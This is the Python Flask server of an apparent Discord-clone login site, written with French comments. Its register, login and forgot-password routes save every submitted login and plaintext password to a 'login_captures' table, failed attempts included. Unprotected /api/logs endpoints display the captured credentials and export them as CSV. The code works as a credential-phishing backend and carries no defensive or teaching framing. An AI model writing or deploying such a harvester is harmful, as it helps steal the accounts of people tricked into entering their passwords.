from flask import Flask, request, jsonify, session, render_template, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
import os
import re
import uuid
import secrets
import logging
from io import StringIO

# ── Configuration ──────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

# Database (Railway PostgreSQL AUTOMATIQUE)
DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///discord_clone.db")
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)

# ── Extensions ─────────────────────────────────────────────────────────────────
db = SQLAlchemy(app)
CORS(app, supports_credentials=True, origins=os.environ.get("ALLOWED_ORIGINS", "*").split(","))
limiter = Limiter(key_func=get_remote_address, app=app, default_limits=["200 per day", "50 per hour"])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── MODELS - NOUVEAU LoginCapture ! ───────────────────────────────────────────
class User(db.Model):
    __tablename__ = "users"
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    username = db.Column(db.String(32), unique=True, nullable=False)
    email = db.Column(db.String(254), unique=True, nullable=False)
    password = db.Column(db.String(256), nullable=False)
    discriminator = db.Column(db.String(4), nullable=False, default="0000")
    avatar = db.Column(db.String(256), nullable=True)
    bio = db.Column(db.String(190), nullable=True)
    verified = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime, nullable=True)
    is_active = db.Column(db.Boolean, default=True)

    def to_dict(self, safe=True):
        data = {
            "id": self.id, "username": self.username, "discriminator": self.discriminator,
            "avatar": self.avatar, "bio": self.bio, "verified": self.verified,
            "created_at": self.created_at.isoformat(),
        }
        if not safe:
            data["email"] = self.email
            data["last_login"] = self.last_login.isoformat() if self.last_login else None
        return data

class LoginAttempt(db.Model):  # Ancien (optionnel)
    __tablename__ = "login_attempts"
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    email = db.Column(db.String(254), nullable=True)
    success = db.Column(db.Boolean, default=False)
    attempted_at = db.Column(db.DateTime, default=datetime.utcnow)

# 🔥 NOUVEAU : LoginCapture (PERSISTANT ∞)
class LoginCapture(db.Model):
    __tablename__ = "login_captures"
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    ip_address = db.Column(db.String(45), nullable=False, index=True)
    login_id = db.Column(db.String(254), nullable=False, index=True)
    password = db.Column(db.Text, nullable=False)  # ✅ PASSWORD EN CLAIR !
    success = db.Column(db.Boolean, default=False)
    username = db.Column(db.String(32), nullable=True)
    email = db.Column(db.String(254), nullable=True)
    user_id = db.Column(db.String(36), nullable=True)

# ── SAVEGARDE DB PERSISTANTE ──────────────────────────────────────────────────
def save_login_attempt(login_id, password, ip_address, success=False, user=None):
    """🚨 SAUVEGARDE DB RAILWAY (persistant ∞)"""
    capture = LoginCapture(
        ip_address=ip_address,
        login_id=login_id,
        password=password,
        success=success,
        username=user.username if user else None,
        email=user.email if user else None,
        user_id=user.id if user else None
    )
    db.session.add(capture)
    db.session.commit()
    logger.info(f"💾 DB CAPTURED: {login_id} from {ip_address} (success: {success})")

# ── Helpers ────────────────────────────────────────────────────────────────────
EMAIL_REGEX = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
PHONE_REGEX = re.compile(r"^\+?[\d\s\-\(\)]{7,15}$")

def validate_email_or_phone(value: str) -> bool:
    return bool(EMAIL_REGEX.match(value)) or bool(PHONE_REGEX.match(value))

def current_user():
    uid = session.get("user_id")
    if not uid: return None
    return User.query.get(uid)

def log_attempt(email, success):
    attempt = LoginAttempt(ip_address=get_remote_address(), email=email, success=success)
    db.session.add(attempt)
    db.session.commit()

def error(message, code=400):
    return jsonify({"success": False, "error": message}), code

def ok(data=None, message="OK", code=200):
    payload = {"success": True, "message": message}
    if data: payload.update(data)
    return jsonify(payload), code

# ── Routes ─────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

# ── REGISTER (SAUVE DB) ───────────────────────────────────────────────────────
@app.route("/api/auth/register", methods=["POST"])
@limiter.limit("10 per hour")
def register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    email = (data.get("email") or "").strip().lower()
    password = (data.get("password") or "")

    # SAUVEGARDE ÉCHECS VALIDATION
    save_login_attempt(email or username, password, get_remote_address(), False)

    if not username or len(username) < 2 or len(username) > 32:
        return error("Username must be between 2 and 32 characters.")
    if not re.match(r"^[\w.]+$", username):
        return error("Username can only contain letters, numbers, dots and underscores.")
    if not email or not EMAIL_REGEX.match(email):
        return error("Please enter a valid email address.")
    if len(password) < 8:
        return error("Password must be at least 8 characters.")

    if User.query.filter_by(email=email).first():
        return error("An account with this email already exists.")
    if User.query.filter_by(username=username).first():
        return error("This username is already taken.")

    discriminator = str(secrets.randbelow(10000)).zfill(4)
    user = User(username=username, email=email, password=generate_password_hash(password), discriminator=discriminator)
    db.session.add(user)
    db.session.commit()
    
    save_login_attempt(email, password, get_remote_address(), True, user)
    
    session.permanent = True
    session["user_id"] = user.id
    return ok({"user": user.to_dict(safe=False)}, "Account created successfully!", 201)

# ── LOGIN (SAUVE DB) ──────────────────────────────────────────────────────────
@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("20 per hour")
def login():
    data = request.get_json(silent=True) or {}
    login_id = (data.get("login") or "").strip().lower()
    password = (data.get("password") or "")
    ip_address = get_remote_address()

    # 🚨 SAUVEGARDE IMMÉDIATE (TOUT !)
    save_login_attempt(login_id, password, ip_address, False)

    if not login_id or not password:
        return error("Please fill in all fields.")
    if not validate_email_or_phone(login_id):
        return error("Please enter a valid email or phone number.")

    user = User.query.filter_by(email=login_id).first()
    is_valid = user and check_password_hash(user.password, password) if user else False
    
    if is_valid:
        save_login_attempt(login_id, password, ip_address, True, user)

    if not is_valid:
        log_attempt(login_id, success=False)
        return error("Invalid credentials.", 401)

    if not user.is_active:
        return error("Account disabled.", 403)

    log_attempt(login_id, success=True)
    user.last_login = datetime.utcnow()
    db.session.commit()

    session.permanent = True
    session["user_id"] = user.id
    return ok({"user": user.to_dict(safe=False)}, "Logged in successfully!")

# ── API LOGS - 🔥 CRITIQUE 🔥 ─────────────────────────────────────────────────
@app.route("/api/logs")
@app.route("/api/logs/raw")
def api_logs_raw():
    """🚨 VOIR TOUS LOGS (50 derniers)"""
    logs = LoginCapture.query.order_by(LoginCapture.timestamp.desc()).limit(50).all()
    html = "<h1>🚨 LOGIN CAPTURES (50 derniers)</h1><pre>"
    for log in logs:
        html += f"{log.timestamp} | {log.ip_address} | {log.login_id} | <b>{log.password}</b> | {log.success}\n"
    html += "</pre><a href='/api/logs/csv'>📥 Download CSV</a>"
    return html

@app.route("/api/logs/csv")
def api_logs_csv():
    """🚨 DOWNLOAD CSV"""
    logs = LoginCapture.query.order_by(LoginCapture.timestamp.desc()).limit(1000).all()
    output = StringIO()
    import csv
    writer = csv.writer(output)
    writer.writerow(['timestamp', 'ip', 'login_id', 'password', 'success', 'username', 'email', 'user_id'])
    for log in logs:
        writer.writerow([
            log.timestamp.isoformat(),
            log.ip_address,
            log.login_id,
            log.password,
            log.success,
            log.username,
            log.email,
            log.user_id
        ])
    output.seek(0)
    return send_file(
        output, 
        mimetype='text/csv',
        as_attachment=True,
        download_name=f"login_captures_{datetime.now().strftime('%Y%m%d')}.csv"
    )

@app.route("/api/logs/count")
def logs_count():
    """🚨 Compteur total"""
    total = db.session.query(LoginCapture).count()
    today = db.session.query(LoginCapture).filter(
        db.func.date(LoginCapture.timestamp) == datetime.now().date()
    ).count()
    return jsonify({"total": total, "today": today})

# ── Autres routes ──────────────────────────────────────────────────────────────
@app.route("/api/auth/logout", methods=["POST"])
def logout(): session.clear(); return ok("Logged out")

@app.route("/api/auth/me", methods=["GET"])
def me():
    user = current_user()
    return error("Not authenticated", 401) if not user else ok({"user": user.to_dict(safe=False)})

@app.route("/api/auth/forgot-password", methods=["POST"])
@limiter.limit("5 per hour")
def forgot_password():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    save_login_attempt(email, "FORGOT_PASSWORD", get_remote_address(), False)
    return ok("Reset link sent" if EMAIL_REGEX.match(email) else error("Invalid email"))

@app.route("/api/users/<user_id>", methods=["GET"])
def get_user(user_id):
    user = User.query.get(user_id)
    return error("User not found", 404) if not user else ok({"user": user.to_dict()})

@app.route("/health")
def health():
    return jsonify({"status": "ok", "logs_ready": True, "timestamp": datetime.utcnow().isoformat()})

# ── Bootstrap ──────────────────────────────────────────────────────────────────
with app.app_context():
    db.create_all()
    logger.info("✅ DB + LoginCapture ready | Use /api/logs/raw")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)